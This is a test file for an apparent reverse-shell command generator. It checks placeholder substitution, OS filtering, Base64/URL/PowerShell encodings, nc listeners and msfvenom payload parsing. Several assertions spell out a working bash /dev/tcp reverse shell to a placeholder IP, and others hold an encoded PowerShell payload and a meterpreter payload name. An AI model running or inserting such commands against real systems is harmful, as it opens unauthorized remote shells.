import test from "node:test";
import assert from "node:assert/strict";
import {
    commands,
    listeners,
    shells,
    COMMAND_TYPES,
    getCommandType,
    getOsTags,
    filterCommands,
    buildCommand,
    buildListener,
    getPayload,
    fixedEncodeURIComponent,
} from "../../apps/web/lib/tools/revshells/index.ts";

const byName = (name) => commands.find((c) => c.name === name);
const opts = { ip: "10.10.10.10", port: 4444, shell: "bash" };

test("payload data loaded with every command family present", () => {
    assert.ok(commands.length > 100, "expected the full command catalogue");
    assert.ok(listeners.length > 10 && shells.length > 10);
    for (const { id } of COMMAND_TYPES) {
        assert.ok(commands.some((c) => getCommandType(c) === id), `no commands for ${id}`);
    }
});

test("substitutes {ip} {port} {shell}", () => {
    assert.equal(buildCommand(byName("Bash -i"), opts), "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1");
});

test("OS filter keeps untagged commands but drops off-OS ones", () => {
    const linux = filterCommands("ReverseShell", "linux");
    const windows = filterCommands("ReverseShell", "windows");
    assert.ok(linux.some((c) => c.name === "Bash -i"));
    assert.ok(!windows.some((c) => c.name === "Bash -i"), "Bash -i is linux/mac only");
    // nc.exe -e is windows-tagged.
    assert.ok(windows.some((c) => getOsTags(c).includes("windows")));
});

test("Base64 encoding round-trips to the plain command", () => {
    const encoded = buildCommand(byName("Bash -i"), { ...opts, encoding: "Base64" });
    assert.equal(Buffer.from(encoded, "base64").toString("utf8"), "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1");
});

test("URL and double-URL encoding escape the command", () => {
    const once = buildCommand(byName("Bash -i"), { ...opts, encoding: "encodeURL" });
    assert.ok(once.includes("%20") && !once.includes(" "), "spaces should be percent-encoded");
    assert.equal(decodeURIComponent(once), "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1");
    const twice = buildCommand(byName("Bash -i"), { ...opts, encoding: "encodeURLDouble" });
    assert.equal(decodeURIComponent(decodeURIComponent(twice)), "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1");
});

test("fixedEncodeURIComponent escapes !'()* as well", () => {
    assert.equal(fixedEncodeURIComponent("a!'()*b"), "a%21%27%28%29%2Ab");
});

test("PowerShell #3 (Base64) emits a decodable UTF-16LE -EncodedCommand", () => {
    const out = buildCommand(byName("PowerShell #3 (Base64)"), opts);
    assert.match(out, /^powershell -e /);
    const b64 = out.slice("powershell -e ".length);
    const decoded = Buffer.from(b64, "base64").toString("utf16le");
    assert.ok(decoded.includes("10.10.10.10") && decoded.includes("4444"), "IP/port baked into the payload");
});

test("Assembled payloads encode ip/port as \\x bytes", () => {
    const assembled = commands.find((c) => getCommandType(c) === "Assembled");
    const out = buildCommand(assembled, { ...opts, ip: "127.0.0.1", port: 4444 });
    assert.ok(out.includes("\\x7f\\x00\\x00\\x01"), "127.0.0.1 -> \\x7f\\x00\\x00\\x01");
    assert.ok(out.includes("\\x11\\x5c"), "4444 -> \\x11\\x5c");
});

test("listener substitutes the port and flags privileged ports", () => {
    const nc = listeners.find((l) => l.name === "nc");
    assert.deepEqual(buildListener(nc, { ip: "10.10.10.10", port: 4444 }), {
        command: "nc -lvnp 4444",
        warning: undefined,
        needsSudo: false,
    });
    assert.equal(buildListener(nc, { ip: "10.10.10.10", port: 80 }).needsSudo, true);
});

test("UDP payload adapts the nc listener and warns for unsupported ones", () => {
    const nc = listeners.find((l) => l.name === "nc");
    const udp = buildListener(nc, { ip: "10.10.10.10", port: 4444, selected: byName("ncat udp") });
    assert.equal(udp.command, "nc -u -lvnp 4444");
    const powercat = listeners.find((l) => l.name === "powercat");
    const warned = buildListener(powercat, { ip: "10.10.10.10", port: 4444, selected: byName("ncat udp") });
    assert.equal(warned.command, "");
    assert.match(warned.warning, /powercat/);
});

test("getPayload reads the msfvenom -p value", () => {
    const msf = commands.find((c) => getCommandType(c) === "MSFVenom");
    assert.match(getPayload(msf), /\//);
    assert.equal(getPayload(byName("Bash -i")), "windows/x64/meterpreter/reverse_tcp");
});
